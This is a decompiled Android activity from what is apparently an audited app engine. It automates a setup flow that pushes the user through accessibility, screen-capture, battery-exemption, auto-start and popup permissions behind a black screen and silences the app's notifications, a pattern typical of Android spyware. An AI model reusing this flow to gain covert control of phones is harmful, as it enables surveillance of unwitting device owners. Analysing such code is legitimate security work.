// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package lyr.stable.runtime.setup;

import a0.a;
import android.app.Activity;
import android.app.KeyguardManager;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.Window;
import android.widget.FrameLayout;
import b2.e;
import c2.p;
import c2.u;
import f2.f;
import f2.g;
import f2.h;
import f2.i;
import f2.i0;
import f2.k;
import f2.l;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import lyr.stable.runtime.MediaProjectionRequestActivity;
import org.json.JSONObject;
import w1.m;
import w1.n;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final class AuthSetupActivity extends Activity {

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final /* synthetic */ int f2655f = 0;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final Handler f2656a = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public boolean f2657b;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public boolean f2658c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public boolean f2659d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public int f2660e;

    /* JADX WARN: Code duplicated, block: B:4:0x002b  */
    public final void a(int i3, String str, String str2) {
        int i4;
        Log.i("AuthSetupActivity", "advance step=" + i3 + " result=" + str + " reason=" + str2);
        int iO = i0.o(i3);
        if (iO < 0) {
            i4 = 7;
        } else {
            int i5 = iO + 1;
            int[] iArr = i0.f1209h;
            if (i5 >= 7) {
                i4 = 7;
            } else {
                i4 = iArr[i5];
            }
        }
        p.e(this, "auto_setup_prefs").edit().putInt("auto_setup_step", i4).apply();
        m.c(this).h(i0.C(i4));
        if (i4 >= 7) {
            g();
            return;
        }
        j("next", 200L);
        if (hasWindowFocus()) {
            return;
        }
        l.g0(this, true);
        l.f0(this, 0);
        i(0);
    }

    public final e b() {
        boolean z2;
        boolean z3;
        boolean z4 = true;
        try {
            PowerManager powerManager = (PowerManager) getSystemService("power");
            boolean z5 = powerManager == null || powerManager.isInteractive();
            try {
                KeyguardManager keyguardManager = (KeyguardManager) getSystemService("keyguard");
                z3 = keyguardManager != null && keyguardManager.isKeyguardLocked();
                z2 = z5;
            } catch (Throwable unused) {
                z4 = z5;
                z2 = z4;
                z3 = false;
            }
        } catch (Throwable unused2) {
        }
        return i0.i(n.p0(this).a(), n.K(this), true, l.m(this), System.currentTimeMillis(), z2, z3, p.e(this, "auto_setup_prefs").getLong("permission_automation_accessibility_destroyed_at", 0L), p.e(this, "auto_setup_prefs").getString("permission_automation_accessibility_destroy_reason", ""));
    }

    public final void c(String str) {
        if (isFinishing() || this.f2658c) {
            return;
        }
        int iN = l.n(this);
        Log.i("AuthSetupActivity", "execute step=" + iN + " why=" + str);
        if (iN < 0) {
            this.f2657b = false;
            l.e0(this, false);
        }
        if (iN >= 7) {
            g();
            return;
        }
        long jCurrentTimeMillis = System.currentTimeMillis();
        long j3 = p.e(this, "auto_setup_prefs").getLong("auto_setup_flow_deadline_at", 0L);
        if (j3 > 0 && jCurrentTimeMillis >= j3) {
            g();
            return;
        }
        if (i0.o(iN) < 0) {
            p.e(this, "auto_setup_prefs").edit().putInt("auto_setup_step", i0.z(iN)).apply();
            j("normalize", 200L);
            return;
        }
        e eVarB = b();
        if (!eVarB.f272b) {
            Log.i("AuthSetupActivity", "step gate: ".concat(eVarB.f273c));
            this.f2656a.postDelayed(new f(this, 2), 1500L);
            return;
        }
        p.e(this, "auto_setup_prefs").edit().putInt("auto_setup_bootstrap_step", iN).putLong("auto_setup_bootstrap_started_at", jCurrentTimeMillis).apply();
        m mVarC = m.c(this);
        int iO = i0.o(iN);
        mVarC.h(iO < 0 ? i0.C(i0.z(iN)) : Math.min(100, ((iO + 1) * 100) / 7));
        if (p.e(this, "auto_setup_prefs").getBoolean(l.i0("completed", iN), false)) {
            a(iN, "success", "already_completed");
            return;
        }
        if (p.e(this, "auto_setup_prefs").getBoolean(l.i0("finished", iN), false)) {
            a(iN, p.e(this, "auto_setup_prefs").getString(l.i0("result", iN), "skipped_safe"), "already_finished");
            return;
        }
        switch (iN) {
            case 0:
                try {
                    PowerManager powerManager = (PowerManager) getSystemService("power");
                    if (powerManager != null && powerManager.isIgnoringBatteryOptimizations(getPackageName())) {
                        d(0, "success", "already_ignoring");
                    }
                    break;
                } catch (Throwable unused) {
                }
                l.Q(this, 0);
                if (!l.v(this, 0, System.currentTimeMillis())) {
                    ArrayList arrayList = new ArrayList();
                    Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    arrayList.add(intent);
                    arrayList.add(new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"));
                    Intent intent2 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                    intent2.setData(Uri.parse("package:" + getPackageName()));
                    arrayList.add(intent2);
                    h(0, arrayList, "standard-battery");
                } else {
                    k(0);
                }
                break;
            case 1:
                if (!i0.B(this)) {
                    ArrayList arrayList2 = new ArrayList();
                    Intent intent3 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                    intent3.setData(Uri.parse("package:" + getPackageName()));
                    arrayList2.add(intent3);
                    h(1, arrayList2, "installed-apps");
                } else {
                    d(1, "success", "already_capable");
                }
                break;
            case 2:
                if (!l.z(this)) {
                    h(2, Collections.EMPTY_LIST, "vendor-battery");
                } else {
                    d(2, "success", "already_verified");
                }
                break;
            case 3:
                if (l.r(this)) {
                    d(3, "success", "already_stashed");
                } else {
                    l.Q(this, 3);
                    if (l.v(this, 3, System.currentTimeMillis())) {
                        k(3);
                    } else {
                        try {
                            startActivity(new Intent(this, (Class<?>) MediaProjectionRequestActivity.class));
                            l.P(this, 3, System.currentTimeMillis());
                            k(3);
                        } catch (Throwable unused2) {
                            l("failed_to_open_screen_capture", 3);
                            return;
                        }
                    }
                }
                break;
            case 4:
                if (!l.p(this)) {
                    h(4, Collections.EMPTY_LIST, "auto-start");
                } else {
                    d(4, "success", "already_verified");
                }
                break;
            case 5:
                if (!getApplicationContext().getSharedPreferences("auth_setup_steps", 4).getBoolean("background_popup_step_verified", false)) {
                    JSONObject jSONObjectE = k.f1219b.e(this).e(5);
                    if (jSONObjectE != null && jSONObjectE.optBoolean("notRequired", false)) {
                        l("not_required", 5);
                    } else {
                        h(5, Collections.EMPTY_LIST, "background-popup");
                    }
                } else {
                    d(5, "success", "already_verified");
                }
                break;
            case 6:
                try {
                    if (((NotificationManager) getSystemService(NotificationManager.class)) != null) {
                        u.e(this);
                        l.x(this);
                        break;
                    }
                } catch (Throwable unused3) {
                }
                int i3 = Build.VERSION.SDK_INT;
                boolean zX = l.x(this);
                if (i3 < 33 && !zX) {
                    ArrayList arrayList3 = new ArrayList();
                    Intent intent4 = new Intent("android.settings.APP_NOTIFICATION_SETTINGS");
                    intent4.putExtra("android.provider.extra.APP_PACKAGE", getPackageName());
                    arrayList3.add(intent4);
                    h(6, arrayList3, "notification-silence");
                } else {
                    d(6, "success", i3 < 33 ? "already_silenced" : "sdk33_not_required");
                }
                break;
            default:
                l("unknown_step", iN);
                break;
        }
    }

    public final void d(int i3, String str, String str2) {
        p.e(this, "auto_setup_prefs").edit().putBoolean(l.i0("finished", i3), true).putBoolean(l.i0("completed", i3), "success".equals(str)).putString(l.i0("result", i3), str).putString(l.i0("reason", i3), str2 == null ? "" : str2).apply();
        if (i3 == 2) {
            if ("success".equals(str)) {
                l.S(this, str2);
            } else {
                l.R(this, str2);
            }
        } else if (i3 == 4) {
            if ("success".equals(str)) {
                l.N(this, str2);
            } else {
                l.M(this, str2);
            }
        }
        p.e(this, "auto_setup_prefs").edit().remove(l.i0("settings_launch_in_flight", i3)).remove(l.i0("settings_launched_at", i3)).apply();
        a(i3, str, str2);
    }

    public final void e(Intent intent, boolean z2) {
        if (intent != null && "lyr.stable.runtime.AUTO_SETUP_RETURN".equals(intent.getAction())) {
            Log.i("AuthSetupActivity", "return intent create=" + z2);
        } else {
            if (n.p0(this).a()) {
                return;
            }
            p.e(this, "auto_setup_prefs").edit().putLong("accessibility_settings_opened_at", System.currentTimeMillis()).putBoolean("accessibility_grant_handoff_pending", true).remove("accessibility_grant_return_active").remove("accessibility_grant_return_started_at").remove("accessibility_grant_return_relaunch_count").apply();
            try {
                startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
                Log.i("AuthSetupActivity", "opened ACTION_ACCESSIBILITY_SETTINGS");
            } catch (Throwable th) {
                a.p(th, new StringBuilder("open a11y settings failed: "), "AuthSetupActivity");
            }
        }
    }

    public final void f(String str) {
        if (this.f2658c) {
            return;
        }
        boolean z2 = p.e(this, "auto_setup_prefs").getBoolean("auto_setup_waiting_for_app_foreground", false);
        if (isFinishing()) {
            return;
        }
        if (!z2 && !hasWindowFocus()) {
            StringBuilder sbK = a.k("setup wait focus why=", str, " focus=");
            sbK.append(hasWindowFocus());
            Log.i("AuthSetupActivity", sbK.toString());
            return;
        }
        Handler handler = this.f2656a;
        if (z2) {
            l.g0(this, false);
            l.f0(this, 0);
            this.f2657b = false;
            l.e0(this, false);
            Log.i("AuthSetupActivity", "foreground confirmed — resume step");
            handler.postDelayed(new f(this, 0), 300L);
            return;
        }
        Intent intent = getIntent();
        if ((intent == null || !"lyr.stable.runtime.AUTO_SETUP_RETURN".equals(intent.getAction())) && !n.p0(this).a()) {
            return;
        }
        Log.i("AuthSetupActivity", "schedule setup why=".concat(str));
        handler.postDelayed(new f(this, 0), 350L);
    }

    public final void g() {
        if (this.f2658c) {
            return;
        }
        this.f2658c = true;
        p.e(this, "auto_setup_prefs").edit().putInt("auto_setup_step", 7).putBoolean("auto_setup_flow_active", false).putBoolean("auto_setup_waiting_for_app_foreground", false).apply();
        new Thread(new a2.m(getApplicationContext(), 2), "auth-route-discovery").start();
        m.c(this).h(100);
        m mVarC = m.c(this);
        mVarC.getClass();
        mVarC.f(11, n.r());
        this.f2656a.post(new f(this, 1));
    }

    /* JADX WARN: Code duplicated, block: B:19:0x0050  */
    public final void h(int i3, List list, String str) {
        String strOptString;
        k kVar = k.f1219b;
        JSONObject jSONObjectE = kVar.e(this).e(i3);
        if (jSONObjectE != null && jSONObjectE.optBoolean("notRequired", false)) {
            l("not_required", i3);
            return;
        }
        l.Q(this, i3);
        if (l.v(this, i3, System.currentTimeMillis())) {
            k(i3);
            return;
        }
        List<Intent> listF = l.f(this, i3, list);
        if (listF.isEmpty()) {
            JSONObject jSONObjectE2 = kVar.e(this).e(i3);
            String str2 = null;
            if (jSONObjectE2 == null) {
                strOptString = null;
            } else {
                strOptString = jSONObjectE2.optString("manualFailureCode", "");
                if (TextUtils.isEmpty(strOptString)) {
                    strOptString = null;
                }
            }
            if (strOptString != null) {
                JSONObject jSONObjectE3 = kVar.e(this).e(i3);
                if (jSONObjectE3 != null) {
                    String strOptString2 = jSONObjectE3.optString("manualFailureCode", "");
                    if (!TextUtils.isEmpty(strOptString2)) {
                        str2 = strOptString2;
                    }
                }
            } else {
                str2 = "no_profile_route";
            }
            l(str2, i3);
            return;
        }
        if (listF.isEmpty()) {
            Log.i("AuthSetupActivity", str.concat(": empty intent list"));
        } else {
            for (Intent intent : listF) {
                if (intent != null) {
                    e eVarG = l.g(this, intent, str);
                    if (eVarG.f272b) {
                        try {
                            Intent intent2 = new Intent(intent);
                            startActivity(intent2);
                            l.P(this, i3, System.currentTimeMillis());
                            StringBuilder sb = new StringBuilder();
                            sb.append(str);
                            sb.append(" started ");
                            ComponentName component = intent2.getComponent();
                            sb.append(component != null ? component.flattenToShortString() : String.valueOf(intent2.getAction()));
                            Log.i("AuthSetupActivity", sb.toString());
                            k(i3);
                            return;
                        } catch (Throwable th) {
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append(str);
                            sb2.append(" start failed: ");
                            a.p(th, sb2, "AuthSetupActivity");
                        }
                    } else {
                        StringBuilder sb3 = new StringBuilder();
                        sb3.append(str);
                        sb3.append(" skip ");
                        a.o(sb3, eVarG.f273c, "AuthSetupActivity");
                    }
                }
            }
        }
        l("failed_to_open_".concat(str), i3);
    }

    public final void i(int i3) {
        if (isFinishing() || this.f2658c) {
            return;
        }
        boolean zHasWindowFocus = hasWindowFocus();
        Handler handler = this.f2656a;
        if (zHasWindowFocus) {
            l.g0(this, false);
            handler.postDelayed(new f(this, 0), 300L);
        } else if (i3 >= 8) {
            Log.w("AuthSetupActivity", "return exhausted — continue flow");
            l.g0(this, false);
            handler.postDelayed(new f(this, 0), 500L);
        } else {
            Log.i("AuthSetupLauncher", "AuthSetup return retired — engine F owns grants");
            l.f0(this, i3 + 1);
            handler.postDelayed(new h(this, i3, 0), 700L);
        }
    }

    public final void j(String str, long j3) {
        int i3 = this.f2660e + 1;
        this.f2660e = i3;
        int iN = l.n(this);
        p.e(this, "auto_setup_prefs").edit().putInt("auto_setup_bootstrap_step", iN).putLong("auto_setup_bootstrap_started_at", System.currentTimeMillis()).apply();
        this.f2656a.postDelayed(new g(this, i3, str, 0), Math.max(0L, j3));
    }

    public final void k(int i3) {
        long jO;
        int i4 = this.f2660e + 1;
        this.f2660e = i4;
        long jCurrentTimeMillis = System.currentTimeMillis();
        String str = Build.MANUFACTURER;
        if (i0.J(l.k(), i3)) {
            jO = 60000;
        } else {
            JSONObject jSONObjectE = k.f1219b.e(this).e(i3);
            if (jSONObjectE == null || !jSONObjectE.has("timeoutMs")) {
                jO = i0.O(i3);
            } else {
                jO = jSONObjectE.optLong("timeoutMs");
                if (jO < 1000) {
                    jO = 1000;
                } else if (jO > 90000) {
                    jO = 90000;
                }
            }
        }
        long j3 = jO;
        this.f2656a.postDelayed(new i(this, i4, i3, jCurrentTimeMillis, j3), Math.min(1000L, j3));
    }

    public final void l(String str, int i3) {
        l.Q(this, i3);
        d(i3, "skipped_safe", str);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        requestWindowFeature(1);
        super.onCreate(bundle);
        Window window = getWindow();
        if (window != null) {
            window.setBackgroundDrawable(new ColorDrawable(-16777216));
        }
        FrameLayout frameLayout = new FrameLayout(this);
        frameLayout.setBackgroundColor(-16777216);
        setContentView(frameLayout);
        e(getIntent(), true);
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        this.f2656a.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Override // android.app.Activity
    public final void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        e(intent, false);
    }

    @Override // android.app.Activity
    public final void onPause() {
        if (!n.p0(this).a()) {
            this.f2659d = true;
        }
        super.onPause();
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        if (!this.f2659d || n.p0(this).a()) {
            f("onResume");
        } else {
            Log.i("AuthSetupActivity", "a11y still off after settings — finish");
            finish();
        }
    }

    @Override // android.app.Activity, android.view.Window.Callback
    public final void onWindowFocusChanged(boolean z2) {
        super.onWindowFocusChanged(z2);
        if (z2) {
            f("onWindowFocusChanged");
        }
    }
}
